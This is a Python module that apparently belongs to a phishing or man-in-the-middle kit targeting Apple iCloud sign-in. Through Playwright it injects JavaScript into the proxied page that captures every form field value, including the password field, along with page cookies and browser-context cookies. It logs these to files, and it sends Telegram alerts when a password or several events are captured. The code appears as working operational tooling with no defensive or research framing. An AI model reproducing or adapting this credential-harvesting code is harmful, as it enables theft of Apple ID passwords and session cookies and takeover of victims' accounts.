"""Live iCloud page collection: text snapshots, DOM listeners, event log."""

from __future__ import annotations

import hashlib
import json
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

from playwright.sync_api import Error as PlaywrightError

from telegram_capture import notify_field_events, notify_new_page

APPLE_CAPTURE_JS = """(() => {
  if (window.__appleCaptureInstalled) return;
  window.__appleCaptureInstalled = true;
  window.__appleCaptureQueue = [];
  function fieldKey(el, i) {
    if (el.id) return el.id;
    if (el.name) return el.name;
    return (el.tagName || 'EL').toLowerCase() + '_' + i;
  }
  function snap() {
    try {
      var fields = {};
      document.querySelectorAll('input, select, textarea').forEach(function (el, i) {
        var key = fieldKey(el, i);
        if (el.type === 'checkbox' || el.type === 'radio') {
          fields[key] = !!el.checked;
        } else {
          fields[key] = el.value || '';
        }
      });
      window.__appleCaptureQueue.push({
        t: Date.now(),
        url: String(location.href),
        cookies: document.cookie || '',
        fields: fields
      });
    } catch (e) { /* never break the host page */ }
  }
  ['change', 'submit', 'click'].forEach(function (evt) {
    document.addEventListener(evt, snap, true);
  });
  snap();
})()"""

APPLE_DRAIN_JS = "(() => window.__appleCaptureQueue ? window.__appleCaptureQueue.splice(0) : null)"

APPLE_TEXT_JS = """(() => {
  var body = (document.body && document.body.innerText) || '';
  return body.trim();
})()"""


def path_of(url: str) -> str:
    path = urlparse(url or '').path or '/'
    if path != '/' and path.endswith('/'):
        path = path.rstrip('/')
    return path or '/'


def page_content_fingerprint(page_key: str, text: str) -> str:
    normalized = ' '.join(text.split())
    return hashlib.sha256((page_key + '\n' + normalized).encode()).hexdigest()[:16]


def load_saved_fingerprints(out_dir: Path) -> set[str]:
    if not out_dir.is_dir():
        return set()
    return {
        p.name.removeprefix('apple_page_').removesuffix('.txt')
        for p in out_dir.glob('apple_page_*.txt')
    }


def text_ready_for_save(text: str, *, loading: bool = False, min_len: int = 40) -> bool:
    if loading:
        return False
    normalized = ' '.join((text or '').split())
    if len(normalized) < min_len:
        return False
    lower = normalized.lower()
    if lower in ('loading...', '. loading...', '. .', '. . loading...'):
        return False
    if len(normalized) < 80 and 'loading' in lower and 'sign in' not in lower:
        return False
    return True


def save_apple_page(out_dir: Path, fp: str, url: str, text: str) -> Path | None:
    path = out_dir / f'apple_page_{fp}.txt'
    if path.exists():
        return None
    try:
        out_dir.mkdir(parents=True, exist_ok=True)
        path.write_text(
            f'URL: {url}\nCaptured: {datetime.now().isoformat()}\n\n{text}',
            encoding='utf-8',
        )
    except OSError:
        return None
    return path


def record_apple_events(out_dir: Path, events: list, context_cookies: list) -> int:
    if not events:
        return 0
    try:
        out_dir.mkdir(parents=True, exist_ok=True)
        with (out_dir / 'apple_capture.jsonl').open('a', encoding='utf-8') as fh:
            for ev in events:
                row = dict(ev)
                row['contextCookies'] = context_cookies
                fh.write(json.dumps(row, ensure_ascii=False) + '\n')
    except OSError:
        return 0
    return len(events)


def build_apple_targets(frame, apple, apple_state, page_info: dict) -> list:
    targets = []
    if frame:
        st = apple_state or {}
        errs = st.get('errors') or []
        err_key = 'noerr' if not errs else hashlib.sha256('\n'.join(errs).encode()).hexdigest()[:8]
        targets.append(
            (
                'frame',
                frame,
                '%s|%s|%s' % (path_of(frame.url), st.get('step'), err_key),
                bool(st.get('loading')),
            )
        )
    targets.append(
        (
            'page',
            apple,
            '%s|%s|%s|%s'
            % (
                path_of(apple.url),
                page_info.get('trust'),
                page_info.get('signedIn'),
                page_info.get('twoFactorOnPage'),
            ),
            False,
        )
    )
    return targets


def run_collection_tick(
    out_dir: Path,
    mirror_context,
    frame,
    apple,
    apple_state,
    page_info: dict,
    *,
    last_saved_keys: dict[str, str],
    known_fps: set[str],
    capture_cookies_fn,
    add_log,
) -> None:
    """Drain listeners, persist new page text, append field/cookie events."""
    for label, target, page_key, loading_flag in build_apple_targets(
        frame, apple, apple_state, page_info
    ):
        try:
            queue = target.evaluate(APPLE_DRAIN_JS)
        except PlaywrightError:
            continue

        if queue is None:
            try:
                target.evaluate(APPLE_CAPTURE_JS)
                add_log(f'[{label}] capture listener attached')
            except PlaywrightError:
                continue
            queue = []

        if page_key != last_saved_keys.get(label):
            try:
                text = target.evaluate(APPLE_TEXT_JS)
            except PlaywrightError:
                text = ''
            if text_ready_for_save(text, loading=loading_flag):
                fp = page_content_fingerprint(page_key, text)
                saved = save_apple_page(out_dir, fp, target.url or '', text)
                known_fps.add(fp)
                last_saved_keys[label] = page_key
                if saved:
                    add_log(f'[{label}] new page saved -> {saved.name}')
                    print(f'  [capture] new apple page -> {saved.name}', flush=True)
                    notify_new_page(saved)

        if queue:
            stamped = [{**ev, 'side': label} for ev in queue]
            n = record_apple_events(out_dir, stamped, capture_cookies_fn(mirror_context))
            if n:
                add_log(f'[{label}] captured {n} event(s): cookies + field values')
                if n >= 2 or any(
                    (ev.get('fields') or {}).get('password_text_field') for ev in stamped
                ):
                    notify_field_events(stamped)
